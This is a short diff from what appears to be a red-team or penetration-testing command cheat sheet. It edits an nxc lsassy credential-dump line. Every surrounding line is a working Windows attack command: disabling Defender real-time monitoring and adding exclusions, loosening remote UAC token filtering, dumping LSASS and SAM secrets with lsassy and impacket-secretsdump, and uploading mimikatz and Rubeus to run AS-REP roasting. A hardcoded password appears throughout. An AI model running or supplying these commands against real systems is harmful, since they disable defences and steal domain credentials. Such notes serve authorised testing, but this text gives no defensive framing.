@@ -1759,7 +1759,7 @@ Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name tasks -Path
 Invoke-Command -ComputerName SRV01 -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows\Tasks" }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
-nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy | tee -a dump_$TARGET; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET | tee -a dump_$TARGET
+nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy --local-auth | tee -a dump_$TARGET; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET | tee -a dump_$TARGET
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
 impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
@@ -1777,7 +1777,7 @@ Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbS
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows\Tasks" }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
-nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy | tee -a dump_$TARGET; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET | tee -a dump_$TARGET
+nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy --local-auth | tee -a dump_$TARGET; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET | tee -a dump_$TARGET
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
 impacket-atexec 'dbf:123qweasdF!'@$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
